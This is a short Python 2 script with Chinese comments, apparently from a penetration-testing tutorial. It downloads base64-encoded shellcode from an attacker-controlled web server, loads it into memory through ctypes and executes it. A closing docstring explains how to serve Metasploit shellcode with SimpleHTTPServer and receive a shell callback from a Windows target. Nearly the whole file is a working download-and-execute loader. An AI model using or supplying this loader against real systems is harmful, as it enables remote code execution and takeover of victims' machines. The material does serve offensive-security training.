#-*- coding:utf8 -*-
"""
        有时候需要与目标机器中的某一台主机进行交互，或者在目标主机上运行你钟爱的渗透测试框架中的某种
    新的漏洞利用模块
        为了执行原生的二进制shellcode，我们只需要在内存中申请缓冲区，然后利用ctypes模块创建指向
    这片内存的函数指针，最后调用这个函数。
        在我们的例子中，我们将利用urlib2模块从Web服务器上下载base64编码的shellcode然后执行.

"""
import urllib2
import ctypes
import base64

# 从我们搭建的服务器下下载shellcode
url = "http://10.10.10.128:8000/shellcode.exe"
response = urllib2.urlopen(url)


# 解码shellcode
shellcode = base64.b64decode(response.read())
# 申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
# 创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
# 执行shellcode
shellcode_func()

"""
    使用：
        将Metasploit生成的shellcode保存在Linux 机器上的"/tmp/shellcode.raw"文件夹中，然后执行：
        1.  base64 -i shellcode.raw > shellcode.bin
        2.  python -m SimpleHTTPServer
        
        我们使用了标准的Linux shell命令对shellcode进行了base64加密，然后利用SimpleHTTPServer模块
        将当前的工作目录（这个例子中为/tmp/ 目录）作为Web服务的根目录，并建立Web服务器.
        这样你所有的对文件的访问请求都会被自动处理，现在，将你的shell_exec.py脚本复制到Windows虚拟机
        中执行.
            如果一切正常，那么你将能在渗透测试框架中接受到shell回连，然后再目标机器上弹出计算器(calc.exe)
        并显示一个对话框或其他你的shellcode提供的任何功能.
        
"""